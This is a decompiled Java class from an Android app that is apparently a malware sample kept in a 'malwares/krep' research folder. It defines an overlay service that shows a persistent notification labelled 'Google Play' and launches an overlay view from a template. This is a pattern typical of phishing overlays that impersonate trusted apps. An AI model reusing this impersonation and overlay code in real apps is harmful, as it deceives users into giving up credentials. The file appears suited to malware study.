package krep.itmtd.ywtjexf;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;

public class OverlayService
  extends Service
{
  public static OverlayService instance;
  protected boolean cancelNotification = false;
  protected boolean foreground = false;
  protected int id = 0;
  private OverlayView overlayView;
  
  private PendingIntent notificationIntent()
  {
    return PendingIntent.getActivity(this, 0, new Intent(this, SampleOverlayHideActivity.class), 134217728);
  }
  
  public static void stop()
  {
    if (instance != null) {
      instance.stopSelf();
    }
  }
  
  protected Notification foregroundNotification(int paramInt)
  {
    Notification localNotification = new Notification(2130837506, "Google Play", System.currentTimeMillis());
    localNotification.flags = (localNotification.flags | 0x2 | 0x8);
    localNotification.setLatestEventInfo(this, getString(2131034114), getString(2131034115), notificationIntent());
    return localNotification;
  }
  
  public String getexstras(Bundle paramBundle, String paramString)
  {
    String str2 = "";
    String str1 = str2;
    if (paramBundle != null)
    {
      str1 = str2;
      if (paramBundle.containsKey(paramString)) {
        str1 = paramBundle.getString(paramString);
      }
    }
    return str1;
  }
  
  public void moveToBackground(int paramInt)
  {
    moveToBackground(paramInt, this.cancelNotification);
  }
  
  public void moveToBackground(int paramInt, boolean paramBoolean)
  {
    this.foreground = false;
    super.stopForeground(paramBoolean);
  }
  
  public void moveToForeground(int paramInt, Notification paramNotification, boolean paramBoolean)
  {
    if ((!this.foreground) && (paramNotification != null))
    {
      this.foreground = true;
      this.id = paramInt;
      this.cancelNotification = paramBoolean;
      super.startForeground(paramInt, paramNotification);
    }
    while ((this.id == paramInt) || (paramInt <= 0) || (paramNotification == null)) {
      return;
    }
    this.id = paramInt;
    ((NotificationManager)getSystemService("notification")).notify(paramInt, paramNotification);
  }
  
  public void moveToForeground(int paramInt, boolean paramBoolean)
  {
    moveToForeground(paramInt, foregroundNotification(paramInt), paramBoolean);
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    if (this.overlayView != null) {
      this.overlayView.destory();
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (paramIntent != null)
    {
      paramIntent = paramIntent.getExtras();
      if (paramIntent != null)
      {
        paramIntent = getexstras(paramIntent, "tpl");
        instance = this;
        this.overlayView = new OverlayView(this, 11, getApplicationContext(), paramIntent);
      }
    }
    return 1;
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/OverlayService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */